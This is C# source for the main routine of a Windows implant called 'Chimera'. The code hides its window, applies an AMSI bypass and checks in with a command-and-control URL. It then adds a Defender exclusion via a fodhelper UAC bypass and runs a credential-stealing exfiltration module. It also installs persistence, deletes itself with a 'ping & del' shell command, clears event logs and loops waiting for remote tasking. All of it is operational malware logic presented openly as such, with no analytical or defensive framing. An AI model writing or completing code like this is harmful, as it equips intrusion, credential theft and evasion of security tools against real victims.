using System;
using System.Threading;

namespace Chimera
{
    static class Program
    {
        [System.STAThread]
        static void Main(string[] args)
        {
            // Hide console window
            var handle = GetConsoleWindow();
            if (handle != IntPtr.Zero) ShowWindow(handle, 0);

            Logger.Info("Process started, PID=" + System.Diagnostics.Process.GetCurrentProcess().Id);

            // ── AMSI bypass ──────────────────────────────────────────────────────────
            Logger.Info("Applying AMSI bypass...");
            try
            {
                bool amsiOk = Commands.AmsiBypass.Apply();
                if (amsiOk) Logger.Ok("AMSI bypass applied.");
                else        Logger.Err("AMSI bypass returned false.");
            }
            catch (Exception ex) { Logger.Err("AMSI bypass exception: " + ex); }

            var rng = new Random();

            // ── Phase 1: Checkin ─────────────────────────────────────────────────────
            Logger.Info("Starting checkin loop...");
            string checkinResponse = null;
            for (int attempt = 0; attempt < 5; attempt++)
            {
                Logger.Info("Checkin attempt " + (attempt + 1) + " to " + Config.CallbackURL);
                try
                {
                    checkinResponse = C2Http.CheckIn();
                    Logger.Info("Checkin response: " + (checkinResponse ?? "<null>"));
                    if (checkinResponse != null && Tasking.ParseCheckinResponse(checkinResponse))
                    {
                        Logger.Ok("Checkin succeeded. UUID=" + Tasking.CallbackUUID);
                        break;
                    }
                }
                catch (Exception ex) { Logger.Err("Checkin attempt " + (attempt+1) + " exception: " + ex.Message); }

                Thread.Sleep(5000 + rng.Next(0, 3000));
            }

            if (string.IsNullOrEmpty(Tasking.CallbackUUID))
            {
                Logger.Err("All checkin attempts failed. Exiting.");
                return;
            }

            // ── Phase 2: Auto startup ────────────────────────────────────────────────
            string startupTaskID = "startup-" + Guid.NewGuid().ToString("N").Substring(0, 8);
            Logger.Info("Phase 2 start. TaskID=" + startupTaskID);

            // 2a. Defender exclusion
            Logger.Info("2a: Running Defender exclusion (fodhelper)...");
            try
            {
                string excResult = Commands.DefenderExclusion.Execute();
                Logger.Ok("Defender exclusion result: " + excResult);
            }
            catch (Exception ex) { Logger.Err("Defender exclusion exception: " + ex.Message); }

            Logger.Info("Waiting 3.5s for exclusion to propagate...");
            Thread.Sleep(3500);

            // 2b. Stealer exfil
            Logger.Info("2b: Running stealer exfil...");
            try
            {
                string stealResult = Commands.StealerExfil.Execute(startupTaskID, Tasking.CallbackUUID);
                Logger.Ok("Stealer result: " + stealResult);
            }
            catch (Exception ex) { Logger.Err("Stealer exception: " + ex.Message); }

            // 2c. Persistence
            Logger.Info("2c: Installing persistence...");
            try
            {
                string persistResult = Commands.Persist.Execute();
                Logger.Ok("Persist result: " + persistResult);
            }
            catch (Exception ex) { Logger.Err("Persist exception: " + ex.Message); }

            // 2d. Self-delete
            Logger.Info("2d: Self-deleting exe...");
            try
            {
                string self = System.Reflection.Assembly.GetExecutingAssembly().Location;
                if (!string.IsNullOrEmpty(self) && System.IO.File.Exists(self))
                {
                    Commands.Shell.Execute("cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q \"" + self + "\"");
                    Logger.Info("Self-delete scheduled for: " + self);
                }
                else Logger.Info("Self-delete skipped (location unknown).");
            }
            catch (Exception ex) { Logger.Err("Self-delete exception: " + ex.Message); }

            // 2e. Clear logs
            Logger.Info("2e: Clearing logs...");
            try
            {
                string clearResult = Commands.ClearLogs.Execute();
                Logger.Ok("ClearLogs result: " + clearResult);
            }
            catch (Exception ex) { Logger.Err("ClearLogs exception: " + ex.Message); }

            Logger.Ok("Phase 2 complete. Entering beacon loop.");

            // ── Phase 3: Beacon loop ─────────────────────────────────────────────────
            int beaconCount = 0;
            while (true)
            {
                try
                {
                    beaconCount++;
                    Logger.Info("Beacon #" + beaconCount + " get_tasking...");
                    string taskingResponse = C2Http.GetTasking(Tasking.CallbackUUID);
                    if (taskingResponse != null)
                    {
                        Logger.Info("Got tasking response (" + taskingResponse.Length + " chars)");
                        Tasking.Dispatch(taskingResponse);
                    }
                    else
                    {
                        Logger.Info("Tasking response null.");
                    }
                }
                catch (Exception ex)
                {
                    Logger.Err("Beacon loop exception: " + ex.Message);
                }

                C2Http.Sleep();
            }
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
